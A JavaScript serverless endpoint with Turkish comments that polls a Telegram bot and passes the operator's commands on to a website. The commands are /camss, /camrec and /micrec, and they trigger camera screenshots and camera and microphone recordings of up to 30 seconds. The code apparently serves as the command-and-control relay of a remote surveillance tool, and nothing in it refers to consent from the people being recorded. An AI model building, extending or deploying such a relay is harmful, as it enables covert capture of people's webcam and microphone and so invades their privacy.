// 🤖 Telegram Bot Command Polling API
// Bu fonksiyon site tarafından çağrılır ve Telegram bot'tan yeni komutları alır
// Komutlar: /camss, /camrec X, /micrec X

const TELEGRAM_API_URL = 'https://api.telegram.org/bot';

// Son işlenen update ID'yi saklama (memory - production'da Redis/KV kullan)
let lastUpdateId = 0;

export default async function handler(req, res) {
    // CORS headers
    res.setHeader('Access-Control-Allow-Credentials', 'true');
    res.setHeader('Access-Control-Allow-Origin', '*');
    res.setHeader('Access-Control-Allow-Methods', 'GET,OPTIONS,POST');
    res.setHeader('Access-Control-Allow-Headers', 'Content-Type');

    if (req.method === 'OPTIONS') {
        res.status(200).end();
        return;
    }

    if (req.method !== 'GET' && req.method !== 'POST') {
        return res.status(405).json({ success: false, error: 'Method not allowed' });
    }

    try {
        const botToken = process.env.TELEGRAM_BOT_TOKEN;
        const allowedChatId = process.env.TELEGRAM_CHAT_ID;

        if (!botToken || !allowedChatId) {
            return res.status(500).json({ success: false, error: 'Server configuration error' });
        }

        // Telegram'dan son mesajları al (getUpdates)
        const telegramUrl = `${TELEGRAM_API_URL}${botToken}/getUpdates?offset=${lastUpdateId + 1}&limit=10&timeout=0`;
        const telegramResponse = await fetch(telegramUrl);
        const telegramData = await telegramResponse.json();

        if (!telegramData.ok) {
            return res.status(500).json({ success: false, error: 'Telegram API error' });
        }

        const updates = telegramData.result;

        // Komutları filtrele (sadece izin verilen chat ID'den)
        const commands = [];
        
        for (const update of updates) {
            if (update.message && update.message.text) {
                const chatId = update.message.chat.id.toString();
                const text = update.message.text.trim();

                // Sadece izin verilen chat ID'den gelen komutları kabul et
                if (chatId === allowedChatId) {
                    // Komut kontrolü
                    if (text === '/camss') {
                        commands.push({
                            command: 'camera_screenshot',
                            params: null,
                            message_id: update.message.message_id
                        });
                    } else if (text.startsWith('/camrec')) {
                        const parts = text.split(' ');
                        const duration = parseInt(parts[1]) || 5;
                        commands.push({
                            command: 'camera_record',
                            params: { duration: Math.min(duration, 30) }, // Max 30 saniye
                            message_id: update.message.message_id
                        });
                    } else if (text.startsWith('/micrec')) {
                        const parts = text.split(' ');
                        const duration = parseInt(parts[1]) || 5;
                        commands.push({
                            command: 'microphone_record',
                            params: { duration: Math.min(duration, 30) }, // Max 30 saniye
                            message_id: update.message.message_id
                        });
                    }
                }

                // Son update ID'yi güncelle
                if (update.update_id > lastUpdateId) {
                    lastUpdateId = update.update_id;
                }
            }
        }

        return res.status(200).json({
            success: true,
            commands: commands,
            count: commands.length
        });

    } catch (error) {
        console.error('Error in get-commands:', error);
        return res.status(500).json({
            success: false,
            error: 'Internal server error',
            message: error.message
        });
    }
}

